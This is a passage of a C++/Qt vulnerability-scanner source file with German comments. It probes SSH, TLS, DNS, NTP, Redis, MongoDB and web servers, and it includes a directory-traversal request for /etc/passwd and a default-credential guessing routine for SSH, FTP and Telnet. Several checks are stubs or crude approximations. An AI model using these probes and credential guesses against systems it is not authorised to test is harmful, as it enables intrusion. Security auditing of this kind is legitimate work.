Authentication\r\n        if (response.contains(\"200 OK\") && !response.contains(\"401 Unauthorized\") &&\r\n            !response.contains(\"403 Forbidden\")) {\r\n            return true;\r\n        }\r\n\r\n        // Check für spezielle Admin-Interfaces\r\n        if (response.contains(\"admin\", Qt::CaseInsensitive) ||\r\n            response.contains(\"dashboard\", Qt::CaseInsensitive) ||\r\n            response.contains(\"control panel\", Qt::CaseInsensitive)) {\r\n            return true;\r\n        }\r\n    }\r\n\r\n    socket.disconnectFromHost();\r\n    return false;\r\n}\r\n\r\n\r\n// ============================================================================\r\n// ECHTE SERVICE-SPEZIFISCHE VULNERABILITY TESTS\r\n// ============================================================================\r\n\r\n\r\nbool VulnerabilityScanner::testSSHVulnerabilities(const QString &ip)\r\n{\r\n    if (!connectToService(ip, 22, 2000)) return false;\r\n\r\n    QTcpSocket socket;\r\n    socket.connectToHost(ip, 22, QIODevice::ReadWrite);\r\n\r\n    if (!socket.waitForConnected(3000)) return false;\r\n\r\n    if (!socket.waitForReadyRead(3000)) {\r\n        socket.disconnectFromHost();\r\n        return false;\r\n    }\r\n\r\n    QString banner = QString::fromUtf8(socket.readAll());\r\n\r\n    // Test 1: Vulnerable SSH versions\r\n    QStringList vulnerableVersions = {\r\n        \"SSH-1.\",           // Protocol 1 - grundsätzlich unsicher\r\n        \"OpenSSH_3.\",       // Sehr alte Version\r\n        \"OpenSSH_4.0\",      // CVE-2006-5051\r\n        \"OpenSSH_4.1\",      // CVE-2006-4924\r\n        \"OpenSSH_4.2\",      // CVE-2006-5052\r\n        \"OpenSSH_5.0\",      // CVE-2010-4478\r\n        \"libssh_0.4\",       // CVE-2014-0017\r\n        \"Dropbear_0.4\",     // Multiple CVEs\r\n        \"WeOnlyDo\"          // Various issues\r\n    };\r\n\r\n    for (const QString &vuln : vulnerableVersions) {\r\n        if (banner.contains(vuln, Qt::CaseInsensitive)) {\r\n            socket.disconnectFromHost();\r\n            return true;\r\n        }\r\n    }\r\n\r\n    // Test 2: SSH-1 Protocol Support\r\n    if (banner.contains(\"SSH-1.99\") || banner.contains(\"SSH-1.5\")) {\r\n        socket.disconnectFromHost();\r\n        return true; // Unterstützt alte Protokolle\r\n    }\r\n\r\n    // Test 3: Weak Encryption Algorithms (vereinfacht)\r\n    // In echter Implementierung würde man Algorithm Negotiation prüfen\r\n    socket.write(\"SSH-2.0-TestClient\\r\\n\");\r\n    socket.flush();\r\n\r\n    if (socket.waitForReadyRead(3000)) {\r\n        // Warte auf Key Exchange\r\n        QByteArray response = socket.readAll();\r\n        // Vereinfachte Prüfung auf schwache Algorithmen\r\n        if (response.contains(\"des\") || response.contains(\"rc4\")) {\r\n            socket.disconnectFromHost();\r\n            return true;\r\n        }\r\n    }\r\n\r\n    socket.disconnectFromHost();\r\n    return false;\r\n}\r\n\r\n// ============================================================================\r\n// ERWEITERTE SSL/TLS TESTS - Echte Implementierung\r\n// ============================================================================\r\n\r\nbool VulnerabilityScanner::testPoodleSSL(const QString &ip, int port)\r\n{\r\n    // POODLE betrifft SSLv3\r\n    QSslSocket socket;\r\n\r\n    // Versuche explizit SSLv3 Verbindung (wenn möglich)\r\n    QSslConfiguration config = socket.sslConfiguration();\r\n    // Moderne Qt-Versionen unterstützen kein SSLv3 mehr\r\n    // Teste stattdessen auf TLS Fallback\r\n\r\n    socket.connectToHostEncrypted(ip, port);\r\n\r\n    if (socket.waitForEncrypted(3000)) {\r\n        QSsl::SslProtocol protocol = socket.sslConfiguration().protocol();\r\n        socket.disconnectFromHost();\r\n\r\n        // Wenn sehr alte TLS-Versionen akzeptiert werden\r\n        if (protocol == QSsl::TlsV1_0) {\r\n            return true; // Potentiell vulnerable für POODLE-ähnliche Angriffe\r\n        }\r\n    }\r\n\r\n    return false;\r\n}\r\n\r\n// ============================================================================\r\n// ERWEITERTE NETWORK VULNERABILITY TESTS\r\n// ============================================================================\r\n\r\nQList<VulnerabilityInfo> VulnerabilityScanner::testNetworkVulnerabilities(const QString &ip)\r\n{\r\n    QList<VulnerabilityInfo> vulnerabilities;\r\n\r\n    // Test 1: Open DNS Resolver (erweitert)\r\n    if (connectToService(ip, 53, 2000)) {\r\n        // Teste ob DNS Recursion erlaubt ist\r\n        QUdpSocket dnsSocket;\r\n\r\n        // DNS Query für externe Domain erstellen\r\n        QByteArray dnsQuery;\r\n        dnsQuery.append(char(0x12)); dnsQuery.append(char(0x34)); // Transaction ID\r\n        dnsQuery.append(char(0x01)); dnsQuery.append(char(0x00)); // Flags (Standard Query)\r\n        dnsQuery.append(char(0x00)); dnsQuery.append(char(0x01)); // Questions\r\n        dnsQuery.append(char(0x00)); dnsQuery.append(char(0x00)); // Answer RRs\r\n        dnsQuery.append(char(0x00)); dnsQuery.append(char(0x00)); // Authority RRs\r\n        dnsQuery.append(char(0x00)); dnsQuery.append(char(0x00)); // Additional RRs\r\n\r\n        // Query für \"google.com\"\r\n        dnsQuery.append(char(0x06)); dnsQuery.append(\"google\");\r\n        dnsQuery.append(char(0x03)); dnsQuery.append(\"com\");\r\n        dnsQuery.append(char(0x00)); // End of name\r\n        dnsQuery.append(char(0x00)); dnsQuery.append(char(0x01)); // Type A\r\n        dnsQuery.append(char(0x00)); dnsQuery.append(char(0x01)); // Class IN\r\n\r\n        dnsSocket.writeDatagram(dnsQuery, QHostAddress(ip), 53);\r\n\r\n        if (dnsSocket.waitForReadyRead(3000)) {\r\n            QByteArray response;\r\n            response.resize(dnsSocket.pendingDatagramSize());\r\n            dnsSocket.readDatagram(response.data(), response.size());\r\n\r\n            // Check ob Response erhalten - deutet auf Open Resolver hin\r\n            if (response.size() > 12) {\r\n                VulnerabilityInfo vuln = createVulnerability(\r\n                    \"DNS_OPEN_RESOLVER\",\r\n                    \"Offener DNS-Resolver erkannt\",\r\n                    VulnSeverity::HIGH,\r\n                    \"DNS\",\r\n                    53,\r\n                    \"DNS-Server antwortet auf rekursive Queries\"\r\n                    );\r\n                vuln.recommendation = \"DNS-Resolver auf autorisierte Clients beschränken\";\r\n                vuln.exploitable = true;\r\n                vuln.exploitMethod = \"DNS-Amplification DDoS-Angriffe möglich\";\r\n                vulnerabilities.append(vuln);\r\n            }\r\n        }\r\n    }\r\n\r\n    // Test 2: NTP Amplification\r\n    if (connectToService(ip, 123, 2000)) {\r\n        QUdpSocket ntpSocket;\r\n\r\n        // NTP monlist request (für Amplification-Angriffe genutzt)\r\n        QByteArray ntpRequest;\r\n        ntpRequest.append(char(0x17)); // Request mode + version\r\n        ntpRequest.append(char(0x00)); // Stratum\r\n        ntpRequest.append(char(0x03)); // Poll\r\n        ntpRequest.append(char(0x2a)); // Precision\r\n        ntpRequest.append(QByteArray(8, 0x00)); // Root delay & dispersion\r\n        ntpRequest.append(QByteArray(32, 0x00)); // Timestamps\r\n\r\n        ntpSocket.writeDatagram(ntpRequest, QHostAddress(ip), 123);\r\n\r\n        if (ntpSocket.waitForReadyRead(2000)) {\r\n            QByteArray response;\r\n            response.resize(ntpSocket.pendingDatagramSize());\r\n            ntpSocket.readDatagram(response.data(), response.size());\r\n\r\n            // Große Response deutet auf Amplification-Potential hin\r\n            if (response.size() > ntpRequest.size() * 2) {\r\n                VulnerabilityInfo vuln = createVulnerability(\r\n                    \"NTP_AMPLIFICATION\",\r\n                    \"NTP-Service anfällig für Amplification-Angriffe\",\r\n                    VulnSeverity::MEDIUM,\r\n                    \"NTP\",\r\n                    123,\r\n                    QString(\"NTP Response %1x größer als Request\").arg(response.size() / ntpRequest.size())\r\n                    );\r\n                vuln.recommendation = \"NTP monlist deaktivieren, Zugriff beschränken\";\r\n                vuln.exploitable = true;\r\n                vuln.exploitMethod = \"NTP Amplification DDoS-Angriffe\";\r\n                vulnerabilities.append(vuln);\r\n            }\r\n        }\r\n    }\r\n\r\n    // Test 3: Open Memcached\r\n    if (connectToService(ip, 11211, 2000)) {\r\n        QTcpSocket memcachedSocket;\r\n        memcachedSocket.connectToHost(ip, 11211, QIODevice::ReadWrite);\r\n\r\n        if (memcachedSocket.waitForConnected(3000)) {\r\n            // Test basic memcached commands\r\n            memcachedSocket.write(\"version\\r\\n\");\r\n            memcachedSocket.flush();\r\n\r\n            if (memcachedSocket.waitForReadyRead(2000)) {\r\n                QString response = QString::fromUtf8(memcachedSocket.readAll());\r\n                if (response.contains(\"VERSION\")) {\r\n                    VulnerabilityInfo vuln = createVulnerability(\r\n                        \"MEMCACHED_OPEN\",\r\n                        \"Offener Memcached-Service\",\r\n                        VulnSeverity::HIGH,\r\n                        \"Memcached\",\r\n                        11211,\r\n                        \"Memcached ohne Authentication erreichbar: \" + response.trimmed()\r\n                        );\r\n                    vuln.recommendation = \"Memcached-Zugriff beschränken oder Authentication aktivieren\";\r\n                    vuln.exploitable = true;\r\n                    vuln.exploitMethod = \"Datenexfiltration, Cache-Poisoning\";\r\n                    vulnerabilities.append(vuln);\r\n                }\r\n            }\r\n            memcachedSocket.disconnectFromHost();\r\n        }\r\n    }\r\n\r\n    // Test 4: Open Redis\r\n    if (connectToService(ip, 6379, 2000)) {\r\n        QTcpSocket redisSocket;\r\n        redisSocket.connectToHost(ip, 6379, QIODevice::ReadWrite);\r\n\r\n        if (redisSocket.waitForConnected(3000)) {\r\n            // Test Redis INFO command\r\n            redisSocket.write(\"INFO\\r\\n\");\r\n            redisSocket.flush();\r\n\r\n            if (redisSocket.waitForReadyRead(2000)) {\r\n                QString response = QString::fromUtf8(redisSocket.readAll());\r\n                if (response.contains(\"redis_version\")) {\r\n                    VulnerabilityInfo vuln = createVulnerability(\r\n                        \"REDIS_OPEN\",\r\n                        \"Offener Redis-Service ohne Authentication\",\r\n                        VulnSeverity::CRITICAL,\r\n                        \"Redis\",\r\n                        6379,\r\n                        \"Redis ohne Passwort erreichbar\"\r\n                        );\r\n                    vuln.recommendation = \"Redis Authentication (requirepass) aktivieren\";\r\n                    vuln.exploitable = true;\r\n                    vuln.exploitMethod = \"Remote Code Execution, Datenexfiltration\";\r\n                    vulnerabilities.append(vuln);\r\n                }\r\n            }\r\n            redisSocket.disconnectFromHost();\r\n        }\r\n    }\r\n\r\n    // Test 5: Open Elasticsearch\r\n    if (connectToService(ip, 9200, 2000)) {\r\n        QTcpSocket elasticSocket;\r\n        elasticSocket.connectToHost(ip, 9200, QIODevice::ReadWrite);\r\n\r\n        if (elasticSocket.waitForConnected(3000)) {\r\n            // HTTP GET to Elasticsearch\r\n            QString httpRequest = QString(\"GET / HTTP/1.1\\r\\n\"\r\n                                          \"Host: %1:9200\\r\\n\"\r\n                                          \"Connection: close\\r\\n\\r\\n\").arg(ip);\r\n\r\n            elasticSocket.write(httpRequest.toUtf8());\r\n            elasticSocket.flush();\r\n\r\n            if (elasticSocket.waitForReadyRead(3000)) {\r\n                QString response = QString::fromUtf8(elasticSocket.readAll());\r\n                if (response.contains(\"elasticsearch\") && response.contains(\"200 OK\")) {\r\n                    VulnerabilityInfo vuln = createVulnerability(\r\n                        \"ELASTICSEARCH_OPEN\",\r\n                        \"Offener Elasticsearch ohne Security\",\r\n                        VulnSeverity::HIGH,\r\n                        \"Elasticsearch\",\r\n                        9200,\r\n                        \"Elasticsearch HTTP API ohne Authentication\"\r\n                        );\r\n                    vuln.recommendation = \"Elasticsearch Security (X-Pack) aktivieren\";\r\n                    vuln.exploitable = true;\r\n                    vuln.exploitMethod = \"Datenexfiltration, Index-Manipulation\";\r\n                    vulnerabilities.append(vuln);\r\n                }\r\n            }\r\n            elasticSocket.disconnectFromHost();\r\n        }\r\n    }\r\n\r\n    // Test 6: Open MongoDB\r\n    if (connectToService(ip, 27017, 2000)) {\r\n        QTcpSocket mongoSocket;\r\n        mongoSocket.connectToHost(ip, 27017, QIODevice::ReadWrite);\r\n\r\n        if (mongoSocket.waitForConnected(3000)) {\r\n            // MongoDB Wire Protocol isMaster command (vereinfacht)\r\n            QByteArray mongoRequest;\r\n            mongoRequest.append(char(0x3a)); mongoRequest.append(char(0x00)); // Message length\r\n            mongoRequest.append(char(0x00)); mongoRequest.append(char(0x00));\r\n            mongoRequest.append(char(0x00)); mongoRequest.append(char(0x00)); // Request ID\r\n            mongoRequest.append(char(0x00)); mongoRequest.append(char(0x00));\r\n            mongoRequest.append(char(0x00)); mongoRequest.append(char(0x00)); // Response to\r\n            mongoRequest.append(char(0x00)); mongoRequest.append(char(0x00));\r\n            mongoRequest.append(char(0xd4)); mongoRequest.append(char(0x07)); // OP_QUERY\r\n            mongoRequest.append(char(0x00)); mongoRequest.append(char(0x00));\r\n            mongoRequest.append(char(0x00)); mongoRequest.append(char(0x00)); // Flags\r\n            mongoRequest.append(\"admin.$cmd\"); // Collection name\r\n            mongoRequest.append(char(0x00)); // Null terminator\r\n            mongoRequest.append(char(0x00)); mongoRequest.append(char(0x00)); // Skip\r\n            mongoRequest.append(char(0x00)); mongoRequest.append(char(0x00));\r\n            mongoRequest.append(char(0x01)); mongoRequest.append(char(0x00)); // Return\r\n            mongoRequest.append(char(0x00)); mongoRequest.append(char(0x00));\r\n\r\n            mongoSocket.write(mongoRequest);\r\n            mongoSocket.flush();\r\n\r\n            if (mongoSocket.waitForReadyRead(3000)) {\r\n                QByteArray response = mongoSocket.readAll();\r\n                if (response.size() > 16) { // MongoDB Response header\r\n                    VulnerabilityInfo vuln = createVulnerability(\r\n                        \"MONGODB_OPEN\",\r\n                        \"Offene MongoDB ohne Authentication\",\r\n                        VulnSeverity::CRITICAL,\r\n                        \"MongoDB\",\r\n                        27017,\r\n                        \"MongoDB akzeptiert Verbindungen ohne Auth\"\r\n                        );\r\n                    vuln.recommendation = \"MongoDB Authentication aktivieren\";\r\n                    vuln.exploitable = true;\r\n                    vuln.exploitMethod = \"Vollzugriff auf Datenbank\";\r\n                    vulnerabilities.append(vuln);\r\n                }\r\n            }\r\n            mongoSocket.disconnectFromHost();\r\n        }\r\n    }\r\n\r\n    return vulnerabilities;\r\n}\r\n\r\n// SSL-specific test implementations\r\nbool VulnerabilityScanner::testHTTPVulnerabilities(const QString &ip, int port)\r\n{\r\n    QTcpSocket socket;\r\n    socket.connectToHost(ip, port, QIODevice::ReadWrite);\r\n\r\n    if (!socket.waitForConnected(3000)) return false;\r\n\r\n    bool hasVulnerability = false;\r\n\r\n    // Test 1: Security Headers\r\n    QString securityHeaderRequest = QString(\"GET / HTTP/1.1\\r\\n\"\r\n                                            \"Host: %1\\r\\n\"\r\n                                            \"User-Agent: SecurityScanner/2.0\\r\\n\"\r\n                                            \"Connection: close\\r\\n\\r\\n\").arg(ip);\r\n\r\n    socket.write(securityHeaderRequest.toUtf8());\r\n    socket.flush();\r\n\r\n    if (socket.waitForReadyRead(5000)) {\r\n        QString response = QString::fromUtf8(socket.readAll());\r\n\r\n        // Check für fehlende Security Headers\r\n        QStringList criticalHeaders = {\r\n            \"X-Frame-Options\", \"X-XSS-Protection\", \"X-Content-Type-Options\",\r\n            \"Strict-Transport-Security\", \"Content-Security-Policy\"\r\n        };\r\n\r\n        int missingHeaders = 0;\r\n        for (const QString &header : criticalHeaders) {\r\n            if (!response.contains(header, Qt::CaseInsensitive)) {\r\n                missingHeaders++;\r\n            }\r\n        }\r\n\r\n        if (missingHeaders >= 3) {\r\n            hasVulnerability = true;\r\n        }\r\n\r\n        // Check für gefährliche Server-Versionen\r\n        QStringList vulnerableServers = {\r\n            \"Apache/2.2.\", \"Apache/2.0.\", \"nginx/1.0.\", \"nginx/0.8.\",\r\n            \"Microsoft-IIS/6.0\", \"Microsoft-IIS/7.0\"\r\n        };\r\n\r\n        for (const QString &server : vulnerableServers) {\r\n            if (response.contains(server, Qt::CaseInsensitive)) {\r\n                hasVulnerability = true;\r\n                break;\r\n            }\r\n        }\r\n\r\n        // Check für Information Disclosure\r\n        if (response.contains(\"Server: \", Qt::CaseInsensitive) &&\r\n            (response.contains(\"Apache/\") || response.contains(\"nginx/\") ||\r\n             response.contains(\"Microsoft-IIS/\"))) {\r\n            hasVulnerability = true; // Server Version disclosure\r\n        }\r\n    }\r\n\r\n    socket.disconnectFromHost();\r\n\r\n    // Test 2: HTTP Methods\r\n    socket.connectToHost(ip, port, QIODevice::ReadWrite);\r\n    if (socket.waitForConnected(3000)) {\r\n        socket.write(\"OPTIONS / HTTP/1.1\\r\\nHost: \" + ip.toUtf8() + \"\\r\\n\\r\\n\");\r\n        socket.flush();\r\n\r\n        if (socket.waitForReadyRead(3000)) {\r\n            QString optionsResponse = QString::fromUtf8(socket.readAll());\r\n\r\n            // Check für gefährliche HTTP Methods\r\n            QStringList dangerousMethods = {\"PUT\", \"DELETE\", \"TRACE\", \"CONNECT\"};\r\n            for (const QString &method : dangerousMethods) {\r\n                if (optionsResponse.contains(method, Qt::CaseInsensitive)) {\r\n                    hasVulnerability = true;\r\n                    break;\r\n                }\r\n            }\r\n        }\r\n        socket.disconnectFromHost();\r\n    }\r\n\r\n    // Test 3: Directory Traversal\r\n    socket.connectToHost(ip, port, QIODevice::ReadWrite);\r\n    if (socket.waitForConnected(3000)) {\r\n        QString traversalRequest = QString(\"GET /../../../etc/passwd HTTP/1.1\\r\\n\"\r\n                                           \"Host: %1\\r\\n\"\r\n                                           \"Connection: close\\r\\n\\r\\n\").arg(ip);\r\n\r\n        socket.write(traversalRequest.toUtf8());\r\n        socket.flush();\r\n\r\n        if (socket.waitForReadyRead(3000)) {\r\n            QString traversalResponse = QString::fromUtf8(socket.readAll());\r\n            if (traversalResponse.contains(\"root:\") || traversalResponse.contains(\"/bin/bash\")) {\r\n                hasVulnerability = true;\r\n            }\r\n        }\r\n        socket.disconnectFromHost();\r\n    }\r\n\r\n    return hasVulnerability;\r\n}\r\n\r\nbool VulnerabilityScanner::testSNMPVulnerabilities(const QString &ip)\r\n{\r\n    // Test for SNMP with default community strings\r\n    return connectToService(ip, 161, 2000);\r\n}\r\n\r\nbool VulnerabilityScanner::testDNSVulnerabilities(const QString &ip)\r\n{\r\n    // Test for open DNS resolver\r\n    return connectToService(ip, 53, 2000);\r\n}\r\n\r\n// Utility methods\r\nQString VulnerabilityScanner::calculateSecurityScore(const QList<VulnerabilityInfo> &vulnerabilities)\r\n{\r\n    int score = 100; // Start with perfect score\r\n\r\n    for (const VulnerabilityInfo &vuln : vulnerabilities) {\r\n        switch (vuln.severity) {\r\n        case VulnSeverity::CRITICAL:\r\n            score -= 25;\r\n            break;\r\n        case VulnSeverity::HIGH:\r\n            score -= 15;\r\n            break;\r\n        case VulnSeverity::MEDIUM:\r\n            score -= 8;\r\n            break;\r\n        case VulnSeverity::LOW:\r\n            score -= 3;\r\n            break;\r\n        case VulnSeverity::INFO:\r\n            score -= 1;\r\n            break;\r\n        }\r\n    }\r\n\r\n    return QString::number(qMax(0, score));\r\n}\r\n\r\nQString VulnerabilityScanner::determineOverallRisk(const QList<VulnerabilityInfo> &vulnerabilities)\r\n{\r\n    int criticalCount = 0, highCount = 0, mediumCount = 0;\r\n\r\n    for (const VulnerabilityInfo &vuln : vulnerabilities) {\r\n        switch (vuln.severity) {\r\n        case VulnSeverity::CRITICAL:\r\n            criticalCount++;\r\n            break;\r\n        case VulnSeverity::HIGH:\r\n            highCount++;\r\n            break;\r\n        case VulnSeverity::MEDIUM:\r\n            mediumCount++;\r\n            break;\r\n        default:\r\n            break;\r\n        }\r\n    }\r\n\r\n    if (criticalCount > 0) return \"CRITICAL\";\r\n    if (highCount >= 3) return \"CRITICAL\";\r\n    if (highCount > 0) return \"HIGH\";\r\n    if (mediumCount >= 5) return \"HIGH\";\r\n    if (mediumCount > 0) return \"MEDIUM\";\r\n\r\n    return \"LOW\";\r\n}\r\n\r\nVulnerabilityInfo VulnerabilityScanner::createVulnerability(const QString &id, const QString &title,\r\n                                                            VulnSeverity severity, const QString &service,\r\n                                                            int port, const QString &evidence)\r\n{\r\n    VulnerabilityInfo vuln;\r\n    vuln.id = id;\r\n    vuln.title = title;\r\n    vuln.severity = severity;\r\n    vuln.service = service;\r\n    vuln.port = port;\r\n    vuln.evidence = evidence;\r\n    vuln.discovered = QDateTime::currentDateTime();\r\n    vuln.exploitable = false;\r\n\r\n    // Set default descriptions based on severity\r\n    switch (severity) {\r\n    case VulnSeverity::CRITICAL:\r\n        vuln.description = \"Kritische Sicherheitslücke - sofortige Maßnahmen erforderlich\";\r\n        break;\r\n    case VulnSeverity::HIGH:\r\n        vuln.description = \"Hohe Sicherheitslücke - baldige Behebung empfohlen\";\r\n        break;\r\n    case VulnSeverity::MEDIUM:\r\n        vuln.description = \"Mittlere Sicherheitslücke - Behebung in nächster Wartung\";\r\n        break;\r\n    case VulnSeverity::LOW:\r\n        vuln.description = \"Niedrige Sicherheitslücke - bei Gelegenheit beheben\";\r\n        break;\r\n    case VulnSeverity::INFO:\r\n        vuln.description = \"Informative Sicherheitshinweise\";\r\n        break;\r\n    }\r\n\r\n    return vuln;\r\n}\r\n\r\nbool VulnerabilityScanner::connectToService(const QString &ip, int port, int timeout)\r\n{\r\n    QTcpSocket socket;\r\n    socket.connectToHost(ip, port, QIODevice::ReadOnly);\r\n    bool connected = socket.waitForConnected(timeout);\r\n\r\n    if (connected) {\r\n        socket.disconnectFromHost();\r\n        socket.waitForDisconnected(1000);\r\n    }\r\n\r\n    return connected;\r\n}\r\n\r\nQString VulnerabilityScanner::grabServiceBanner(const QString &ip, int port)\r\n{\r\n    QTcpSocket socket;\r\n    socket.connectToHost(ip, port, QIODevice::ReadWrite);\r\n\r\n    if (!socket.waitForConnected(3000)) {\r\n        return QString();\r\n    }\r\n\r\n    // Wait for banner or send HTTP request for web servers\r\n    if (port == 80 || port == 8080) {\r\n        socket.write(\"GET / HTTP/1.0\\r\\n\\r\\n\");\r\n        socket.flush();\r\n    }\r\n\r\n    if (socket.waitForReadyRead(2000)) {\r\n        QByteArray data = socket.readAll();\r\n        socket.disconnectFromHost();\r\n        return QString::fromUtf8(data).left(512); // Limit banner size\r\n    }\r\n\r\n    socket.disconnectFromHost();\r\n    return QString();\r\n}\r\n\r\nbool VulnerabilityScanner::sendCommand(QTcpSocket *socket, const QString &command, QString &response)\r\n{\r\n    if (!socket || !socket->isOpen()) return false;\r\n\r\n    socket->write(command.toUtf8());\r\n    socket->flush();\r\n\r\n    if (socket->waitForReadyRead(3000)) {\r\n        response = QString::fromUtf8(socket->readAll());\r\n        return true;\r\n    }\r\n\r\n    return false;\r\n}\r\n\r\nvoid VulnerabilityScanner::handleSslErrors(const QList<QSslError> &errors)\r\n{\r\n    // Log SSL errors for analysis\r\n    for (const QSslError &error : errors) {\r\n        qDebug() << \"SSL Error:\" << error.errorString();\r\n    }\r\n}\r\n\r\n// ============================================================================\r\n// SSLVulnerabilityScanner Implementation\r\n// ============================================================================\r\n\r\nSSLVulnerabilityScanner::SSLVulnerabilityScanner(const QString &ip, int port, QObject *parent)\r\n    : QObject(parent), targetIp(ip), targetPort(port)\r\n{\r\n    setAutoDelete(true);\r\n}\r\n\r\nvoid SSLVulnerabilityScanner::run()\r\n{\r\n    QList<VulnerabilityInfo> vulnerabilities;\r\n\r\n    try {\r\n        // Test various SSL/TLS vulnerabilities\r\n        if (testWeakCiphers(targetIp, targetPort)) {\r\n            VulnerabilityInfo vuln;\r\n            vuln.id = \"SSL_WEAK_CIPHERS\";\r\n            vuln.title = \"Weak SSL/TLS Cipher Suites\";\r\n            vuln.severity = VulnSeverity::MEDIUM;\r\n            vuln.service = \"SSL/TLS\";\r\n            vuln.port = targetPort;\r\n            vuln.evidence = \"Weak cipher suites detected\";\r\n            vuln.recommendation = \"Configure strong cipher suites only\";\r\n            vulnerabilities.append(vuln);\r\n\r\n            emit sslVulnerabilityFound(targetIp, targetPort, vuln);\r\n        }\r\n\r\n        if (testCertificateValidation(targetIp, targetPort)) {\r\n            VulnerabilityInfo vuln;\r\n            vuln.id = \"SSL_CERT_INVALID\";\r\n            vuln.title = \"Invalid SSL Certificate\";\r\n            vuln.severity = VulnSeverity::MEDIUM;\r\n            vuln.service = \"SSL/TLS\";\r\n            vuln.port = targetPort;\r\n            vuln.evidence = \"Certificate validation failed\";\r\n            vuln.recommendation = \"Install valid SSL certificate\";\r\n            vulnerabilities.append(vuln);\r\n\r\n            emit sslVulnerabilityFound(targetIp, targetPort, vuln);\r\n        }\r\n\r\n        emit sslScanComplete(targetIp, targetPort, vulnerabilities);\r\n\r\n    } catch (const std::exception& e) {\r\n        qDebug() << \"SSL Scanner Exception:\" << e.what();\r\n    } catch (...) {\r\n        qDebug() << \"SSL Scanner Unknown Exception\";\r\n    }\r\n}\r\n\r\nbool SSLVulnerabilityScanner::testSSLv2Support(const QString &ip, int port)\r\n{\r\n    // SSLv2 is deprecated and not supported in modern Qt\r\n    Q_UNUSED(ip)\r\n    Q_UNUSED(port)\r\n    return false;\r\n}\r\n\r\nbool SSLVulnerabilityScanner::testSSLv3Support(const QString &ip, int port)\r\n{\r\n    QSslSocket socket;\r\n    socket.connectToHostEncrypted(ip, port);\r\n    bool supported = socket.waitForEncrypted(3000);\r\n\r\n    if (supported) {\r\n        socket.disconnectFromHost();\r\n    }\r\n\r\n    return false; // SSLv3 support check would need more specific implementation\r\n}\r\n\r\nbool SSLVulnerabilityScanner::testTLS10Support(const QString &ip, int port)\r\n{\r\n    QSslSocket socket;\r\n    QSslConfiguration config = socket.sslConfiguration();\r\n    config.setProtocol(QSsl::TlsV1_2OrLater);\r\n    socket.setSslConfiguration(config);\r\n\r\n    socket.connectToHostEncrypted(ip, port);\r\n    bool supported = socket.waitForEncrypted(3000);\r\n\r\n    if (supported) {\r\n        socket.disconnectFromHost();\r\n    }\r\n\r\n    return !supported; // If TLS 1.2+ fails, might indicate TLS 1.0 dependency\r\n}\r\n\r\nbool SSLVulnerabilityScanner::testWeakCiphers(const QString &ip, int port)\r\n{\r\n    QSslSocket socket;\r\n    socket.connectToHostEncrypted(ip, port);\r\n\r\n    if (socket.waitForEncrypted(3000)) {\r\n        QSslCipher cipher = socket.sessionCipher();\r\n        QString cipherName = cipher.name();\r\n\r\n        QStringList weakCiphers = {\"RC4\", \"DES\", \"MD5\", \"NULL\", \"EXPORT\"};\r\n\r\n        for (const QString &weak : weakCiphers) {\r\n            if (cipherName.contains(weak, Qt::CaseInsensitive)) {\r\n                socket.disconnectFromHost();\r\n                return true;\r\n            }\r\n        }\r\n        socket.disconnectFromHost();\r\n    }\r\n    return false;\r\n}\r\n\r\nbool SSLVulnerabilityScanner::testCertificateValidation(const QString &ip, int port)\r\n{\r\n    QSslSocket socket;\r\n    socket.connectToHostEncrypted(ip, port);\r\n\r\n    if (socket.waitForEncrypted(3000)) {\r\n        QList<QSslError> errors = socket.sslHandshakeErrors();\r\n        socket.disconnectFromHost();\r\n        return !errors.isEmpty();\r\n    }\r\n\r\n    return true; // Connection failed, assume certificate issues\r\n}\r\n\r\nQStringList SSLVulnerabilityScanner::getAvailableCiphers(const QString &ip, int port)\r\n{\r\n    QStringList ciphers;\r\n\r\n    QSslSocket socket;\r\n    socket.connectToHostEncrypted(ip, port);\r\n\r\n    if (socket.waitForEncrypted(3000)) {\r\n        QSslConfiguration config = socket.sslConfiguration();\r\n        // Get supported ciphers would need different approach in practice\r\n        ciphers.append(\"Implementation needed\");\r\n        socket.disconnectFromHost();\r\n    }\r\n\r\n    return ciphers;\r\n}\r\n\r\nQSslCertificate SSLVulnerabilityScanner::getCertificate(const QString &ip, int port)\r\n{\r\n    QSslSocket socket;\r\n    socket.connectToHostEncrypted(ip, port);\r\n\r\n    if (socket.waitForEncrypted(3000)) {\r\n        QSslCertificate cert = socket.peerCertificate();\r\n        socket.disconnectFromHost();\r\n        return cert;\r\n    }\r\n\r\n    return QSslCertificate();\r\n}\r\n\r\n// ============================================================================\r\n// CredentialTester Implementation\r\n// ============================================================================\r\n\r\nCredentialTester::CredentialTester(const QString &ip, const QString &service, int port, QObject *parent)\r\n    : QObject(parent), targetIp(ip), serviceName(service), targetPort(port)\r\n{\r\n    setAutoDelete(true);\r\n    loadCommonCredentials();\r\n}\r\n\r\nvoid CredentialTester::run()\r\n{\r\n    int testedCount = 0;\r\n    int foundCount = 0;\r\n\r\n    try {\r\n        for (const auto &cred : credentials) {\r\n            QString username = cred.first;\r\n            QString password = cred.second;\r\n\r\n            bool success = false;\r\n\r\n            if (serviceName.toLower() == \"ssh\") {\r\n                success = testSSHCredentials(targetIp, targetPort, username, password);\r\n            } else if (serviceName.toLower() == \"ftp\") {\r\n                success = testFTPCredentials(targetIp, targetPort, username, password);\r\n            } else if (serviceName.toLower() == \"telnet\") {\r\n                success = testTelnetCredentials(targetIp, targetPort, username, password);\r\n            }\r\n\r\n            testedCount++;\r\n\r\n            if (success) {\r\n                foundCount++;\r\n                emit credentialFound(targetIp, targetPort, serviceName, username, password);\r\n            }\r\n\r\n            // Rate limiting to avoid account lockouts\r\n            QThread::msleep(1000);\r\n        }\r\n\r\n        emit credentialTestComplete(targetIp, targetPort, testedCount, foundCount);\r\n\r\n    } catch (const std::exception& e) {\r\n        qDebug() << \"Credential Tester Exception:\" << e.what();\r\n    } catch (...) {\r\n        qDebug() << \"Credential Tester Unknown Exception\";\r\n    }\r\n}\r\n\r\nvoid CredentialTester::addCredentialPair(const QString &username, const QString &password)\r\n{\r\n    credentials.append(qMakePair(username, password));\r\n}\r\n\r\nvoid CredentialTester::loadCommonCredentials()\r\n{\r\n    // Load common default credentials based on service\r\n    QStringList commonUsers = {\"admin\", \"root\", \"user\", \"guest\", \"test\"};\r\n    QStringList commonPasses = {\"admin\", \"root\", \"password\", \"123456\", \"\", \"test\"};\r\n\r\n    for (const QString &user : commonUsers) {\r\n        for (const QString &pass : commonPasses) {\r\n            credentials.append(qMakePair(user, pass));\r\n        }\r\n    }\r\n\r\n    // Add service-specific credentials\r\n    if (serviceName.toLower() == \"ftp\") {\r\n        